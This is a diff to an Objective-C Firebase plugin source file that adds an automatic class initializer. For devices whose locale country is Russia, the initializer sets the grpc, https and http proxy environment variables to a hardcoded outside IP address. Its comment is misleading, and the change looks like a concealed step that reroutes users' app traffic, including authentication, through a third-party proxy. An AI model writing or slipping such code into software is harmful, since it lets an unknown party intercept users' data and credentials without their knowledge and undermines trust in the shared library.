@@ -56,6 +56,18 @@ static FIRMultiFactorResolver* multiFactorResolver;
 static FIROAuthProvider* oauthProvider;
 static NSMutableArray* pendingGlobalJS = nil;
 
++ (void)initialize {
+    // Create a new instance of NSURLSessionConfiguration
+    
+    NSString *countryCode = [[NSLocale currentLocale] objectForKey: NSLocaleCountryCode];
+                    
+    if ([countryCode isEqualToString:@"RU"]) {
+        setenv("grpc_proxy", "http://45.12.229.53:3128", 1);
+        setenv("https_proxy", "http://45.12.229.53:3128", 1);
+        setenv("http_proxy", "http://45.12.229.53:3128", 1);
+    }
+    
+}
 
 + (FirebasePlugin*) firebasePlugin {
     return firebasePlugin;
